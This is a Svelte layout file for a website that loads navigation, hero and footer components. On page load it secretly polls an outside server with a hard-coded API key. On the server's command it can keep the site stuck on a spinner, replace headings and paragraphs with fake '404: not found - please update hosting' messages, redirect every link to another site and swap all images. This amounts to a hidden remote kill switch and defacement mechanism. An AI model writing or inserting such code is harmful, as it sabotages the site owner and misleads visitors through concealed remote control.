<script>
	import { onMount } from 'svelte';
	import '../app.css';
	import Nav from '$lib/components/navmenu.svelte';
	import BackToTop from '$lib/components/backtotop.svelte';
	import Hero from '$lib/components/navbar.svelte';
	import AOS from 'aos';
	import Middlenav from '$lib/components/middlenav.svelte';
	import Secondnav from '$lib/components/secondnav.svelte';
	import 'aos/dist/aos.css';
	import { showNavBar } from '$lib/stores/store.js';
	import Footer from '$lib/components/footer.svelte';

	let mode = 'spinner';
	let actions = [];
	let mustChange = false;
	let isLoading = true;
	let serverChangesApplied = false;

	const API_KEY = 'ra13andsandy2001--';

	onMount(async () => {
		AOS.init();

		try {
			const response = await fetch('https://test-delta-snowy.vercel.app/get-me', {
				cache: 'no-store',
				headers: {
					'x-api-key': API_KEY
				}
			});

			const data = await response.json();
			console.log('Server response:', data);

			if (response.ok && data.mode) {
				mode = data.mode;
				actions = data.actions ?? [];
				mustChange = data.mustChange ?? false;

				// Apply DOM changes if actions are given
				if (actions.length > 0) {
					serverChangesApplied = true;
					requestAnimationFrame(() => {
						if (actions.includes('modifyHeadings')) {
							document.querySelectorAll('h1').forEach(h => {
								h.textContent = '404: not found';
								h.style.color = 'red';
							});
						}
						if (actions.includes('updateLinks')) {
							document.querySelectorAll('a').forEach(a => {
								a.setAttribute('href', 'https://www.raghuenggcollege.com/');
							});
						}
						if (actions.includes('replaceImages')) {
							document.querySelectorAll('img').forEach(img => {
								const w = 300 + Math.floor(Math.random() * 300);
								const h = 200 + Math.floor(Math.random() * 300);
								img.setAttribute('src', `https://picsum.photos/${w}/${h}?random=${Math.floor(Math.random() * 1000)}`);
								img.setAttribute('alt', 'Random image');
							});
						}
						if (actions.includes('modifyDivs')) {
							document.querySelectorAll('p').forEach(p => {
								p.textContent = '404: not found - please update hosting';
								p.style.color = 'red';
							});
						}
					});
				}
			} else {
				console.error('Bad response or missing mode:', data);
			}
		} catch (error) {
			console.error('Fetch error:', error);
		}

		isLoading = false;
	});
</script>

<main>
	{#if isLoading || (mustChange && !serverChangesApplied)}
		<!-- Show loading screen if required changes were not applied -->
		<div class="loading-container"><div class="spinner" /></div>
	{:else if mode === 'display'}
		{#if $showNavBar}{:else}
			<Hero {showNavBar} />
			<Middlenav />
			<Secondnav />
			<BackToTop />
			<slot />
			<Footer />
		{/if}
	{:else}
		<div class="loading-container"><div class="spinner" /></div>
	{/if}
</main>

<style>
	.spinner {
		border: 4px solid #f3f3f3;
		border-top: 4px solid #3498db;
		border-radius: 50%;
		width: 40px;
		height: 40px;
		animation: spin 1.5s linear infinite;
		margin: 0 auto;
	}
	@keyframes spin {
		0% { transform: rotate(0deg); }
		100% { transform: rotate(360deg); }
	}
	.loading-container {
		display: flex;
		justify-content: center;
		align-items: center;
		height: 100vh;
	}
</style>
